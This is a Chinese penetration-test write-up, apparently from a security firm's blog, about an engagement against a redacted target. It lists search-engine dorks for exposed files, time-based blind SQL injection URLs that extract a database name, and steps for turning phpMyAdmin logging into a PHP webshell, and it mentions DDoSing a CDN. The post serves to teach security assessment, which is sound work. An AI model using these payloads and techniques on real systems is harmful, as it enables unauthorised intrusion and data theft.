## 一、网络渗透测试概述

**网络渗透测试完全模拟黑客可能使用的攻击技术和漏洞发现技术，对目标系统的安全做深入的探测，发现网络脆弱环节，能直观的让网络管理员知道自己网络所面临的问题。所以渗透测试是安全评估的方法之一。**

随着信息技术的发展，网络已成为一个新的战场。美国智库兰德公司称网络战为信息时代的核武器，能够在网络上引发核爆的网络战，从过去的网络威慑已经开始向实战迈进。过去美国还掖着藏着，不过近年来特朗普对敌对国家步步紧逼已经开始露出獠牙，委内瑞拉的电网瘫痪就是典型的网络战。

中国也是遭受网络攻击最多的国家之一，特别是在一些关键时期，例如每年两会期间、G20期间、以及这次新冠病毒疫情期间，我国遭受的网络攻击都要比正常事情多的多。

为了提高政府、企事业单位、关键基础设施网络等的安全性，相关单位会邀请专业安全服务公司（或自行）对其网络进行渗透测试，发现网络脆弱环节，并进行相应的整改。

接下来我们就以六方云攻防实验室受邀对某重点单位的一次渗透测试服务为例，简单介绍下网络渗透测试的过程。

## 二、网络渗透测试实例

### 2.1信息搜集

在渗透测试中很多人常常是一上来就开始搞事情，不愿意去对目标网站或服务做过多的信息收集，这可能会导致我们找不到相应的突破点。而这就体出信息收集的意义与重要性，在我自己看来，久攻不下的网站并不是我们能力不够而是我们信息收集的不够，所以信息收集在是整个渗透测试中最重要的一步，也是非常有必要去做的一步。

2.1.1域名收集

(1)域名注册人信息收集，我们可以通过whois,来收集域名持有者的一些信息，比如姓名，电话，邮箱，域名变动等等。

(2)子域名收集，通过在线工具，或kali中的工具不断的去收集子域名的信息寻找更多的子域名。

2.1.2绕过CND收集真实IP

找旁站、情报威胁中心、超级PING、路由追踪、跨域、前端js代码、查找域名历史IP地址、以及最后的疯狂上ddos打掉cdn。

当前互联网给我们带来方便的同时也为我们造成了大量的信息泄露，而这里我们可以善用搜索引擎语法快速的找到我们想要的信息。

(1)搜索敏感文件

> site:xxx.com filetype:doc intext:密码
>
> site:xxx.com filetype:xlsintext:pass
>
> site:xxx.com filetype:bak
>
> 多种组合....

(2)后台搜索

> site:xxx.com管理
>
> site:xxx.com登录
>
> site:xxx.com inurl:admin
>
> site:xxx.com inurl:login
>
> 多种组合...

(3) Email搜索

> site:xxx.com inext:@xxx.com
>
> ...多种组合

(4)敏感路径

> site:xxx.com inurl:phpinfo.php
>
> site:xxx.com inurl:phpmyadmin
>
> ...多种组合

2.1.3服务器操作系统

2.1.4端口开放服务识别

2.1.5收集同站其他服务站点等

![](https://www.6cloudtech.com/upload/default/20200427/036ad3e54c7a93aec3f834e1395b0cee.png)

2.1.6C段IP

当我们将搜集的ip汇总下后，发现重要ip段基本都在一个c段。

![](https://www.6cloudtech.com/upload/default/20200427/b1c90633e8414422e563f8babb3cfc9d.png)

xxx.xxx.22.0/24确认这c段ip有可能就是目标单位的资产ip段。对这个ip段进行端口搜集

（这里端口搜集由于是整个c段、而我搜集的是1-65535目标端口、目标搜集工作量过大比较费时进行了很久、第二天才出结果）

![](https://www.6cloudtech.com/upload/default/20200427/81fc0048d2e8290dd9677775c493b10d.png)

这里跳过不必要的步骤直接对信息搜集端口进行尝试，确认哪些是可用信息。

![](https://www.6cloudtech.com/upload/default/20200427/6e8c93271efedac77a7e856be4b78550.png)

猜测xxx.xxx.22.189ip公网ip每个端口单独映射到内网系统

### 2.2实战开始

前期搜集的资产信息越广，我们的攻击面就越多，所以后期的成就是建立在前期的信息搜集之上。

2.2.1首先对目标进行测试发现官网存在sql时间盲注

延迟注入，是一种盲注的手法,提交对执行时间敏感的函数sql语句，通过执行时间的长短来判断是否执行成功，比如:正确的话会导致时间很长，错误的话会导致执行时间很短，这就是所谓的高级盲注。

![](https://www.6cloudtech.com/upload/default/20200427/3ac701660db9fb98996aa478a4f27f2c.png)

[https://xxx.xxx.com/ListInfo/?classid=40&line=A%BF&lineid=if(now()=sysdate()%2Csleep(10)%2C0)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=A%BF&lineid=if\(now\(\)=sysdate\(\)%2Csleep\(10\)%2C0\)&ph=1&station=)

![](https://www.6cloudtech.com/upload/default/20200427/9cdeac8c10de19563d50018262dbb61d.png)

在这里用出sqlmap直接开跑发现跑不出来失败了，范围太大就精确点手工把数据库名弄出来在跑表

![](https://www.6cloudtech.com/upload/default/20200427/e3d9396f698ae5e893e8ee6553674e80.png)

首先确认数据库名称长度

需要把判断注入点换成if(length(database())=6%2Csleep(10)%2C0)，此语法是判断数据库名称长度是否等于6，如果是沉睡10秒，如果不是不沉睡。

[https://xxx.xxx.com/ListInfo/?classid=40&line=A%BF&lineid=
if(length(database())=6%2Csleep(10)%2C0)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=A%BF&lineid=%20if\(length\(database\(\)\)=6%2Csleep\(10\)%2C0\)&ph=1&station=)

![](https://www.6cloudtech.com/upload/default/20200427/fef326298d97a4cf1f6bbd96d0c51fb1.png)

长度错误如下

![](https://www.6cloudtech.com/upload/default/20200427/84c8384a0fd38c4f6987f74ee8c179cc.png)

得到了数据库名长度、来猜测对应字段、就需要把if(length(database())=6换成if(ascii(substr(database(),1,1))=100,sleep(5),1)这段的意思是if判断数据库名称的第一位开始后推迟一位用ascii表示是否等于100，如果是就沉睡5秒，如果不是就不沉睡

最后判断如下：数据库名称为dt_web

d

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),1,1))=100,sleep(5),1)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),1,1\)\)=100,sleep\(5\),1\)&ph=1&station=)

t

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),2,1))=116,sleep(5),1)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),2,1\)\)=116,sleep\(5\),1\)&ph=1&station=)

_

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),3,1))=95,sleep(5),1)&ph=1&station=1](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),3,1\)\)=95,sleep\(5\),1\)&ph=1&station=1)

w

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),4,1))=119,sleep(5),1)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),4,1\)\)=119,sleep\(5\),1\)&ph=1&station=)

e

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),5,1))=101,sleep(5),1)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),5,1\)\)=101,sleep\(5\),1\)&ph=1&station=)

b

[https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if(ascii(substr(database(),6,1))=98,sleep(5),1)&ph=1&station=](https://xxx.xxx.com/ListInfo/?classid=40&line=1&lineid=if\(ascii\(substr\(database\(\),6,1\)\)=98,sleep\(5\),1\)&ph=1&station=)

手工把数据库名称爆出来了，继续用处sqlmap跑表。

+-------------+

| Parametre |

| TIL_IDIOTON |

| store |

| verkaeufer |

+-------------+

![](https://www.6cloudtech.com/upload/default/20200427/2d12933ea6349a60a364cf1cc7637457.png)

Sqlmap跑出来四张表、按个对每张表进行字段猜解、跑了一段时间、没出结果。只能手工猜解了、但是猜字段这步骤手工验证需要花费时间非常多、这个sql注入就到这里结束了。

2.2.2接下来又在上图找到的xxx.xxx.22.189:10037网站上发现phpmyadmin网站。该网站问题由于开发者不适当的配置，让我免登录直接进入phpmyadmin内部。

![](https://www.6cloudtech.com/upload/default/20200427/41b044e65f1fc7cafa1f186413e5005f.png)

既然phpMyAdmin成功进入、那么就可以随意查看数据库信息、篡改信息、增加信息、删除信息、脱库等一些敏感操作。

![](https://www.6cloudtech.com/upload/default/20200427/b1b7774469b0bfc8db0f0e86e3a3ef73.png)

![](https://www.6cloudtech.com/upload/default/20200427/d3387aee4138c50538e7e92158238c0a.png)

通过上图可以看到、用户密码处、似乎采用了linux用户密码同样加密的手法。

2.2.3知道了phpmyadmin版本信息，借助phpmyadmin日志getshell

1）将general_log打开

![](https://www.6cloudtech.com/upload/default/20200427/a10797e76d6ef029c17195cd7c0704cd.png)

![](https://www.6cloudtech.com/upload/default/20200427/872729111d88116721112ebaa2a0bf6e.png)

2）将日志文件自定义

问题来了我不知道网站路径是哪个？只知道是D:\MYOA\目录如何自定义路径？

我这边用到的方法是、把数据库脱下来、在一条条匹配信息。

![](https://www.6cloudtech.com/upload/default/20200427/2b9feb7a5c11326af55a5a3ab91756b4.png)

确认网站绝对路径为D:\MYOA\webroot\

已知网站绝对路径、我们可以直接自定义日志文件。

![](https://www.6cloudtech.com/upload/default/20200427/c7ed39d3736f920e5cbd97894cc68cd5.png)

3）使用sql语句写入php一句话木马

![](https://www.6cloudtech.com/upload/default/20200427/074a80a9af8029279069958d414ec969.png)

4）webshell工具连接

![](https://www.6cloudtech.com/upload/default/20200427/2c5162f5de3b8113825b44be911c6676.png)

5）提升权限

![](https://www.6cloudtech.com/upload/default/20200427/b96a30b8063c27d8491a9420f29342ad.png)

### 2.3测试结果

测试发现了多个漏洞，总结如下：

![](https://www.6cloudtech.com/upload/default/20200427/cf2cc76da7e849d77b60b3940f631fb2.png)

## 三、总结

没有网络安全，就没有国家安全！并不仅仅只是一句口号，让我们一起行动起来，为国家网络安全事业做出自己的贡献！

 ***本文作者：6cloud，转载请注明来自FreeBuf.COM**

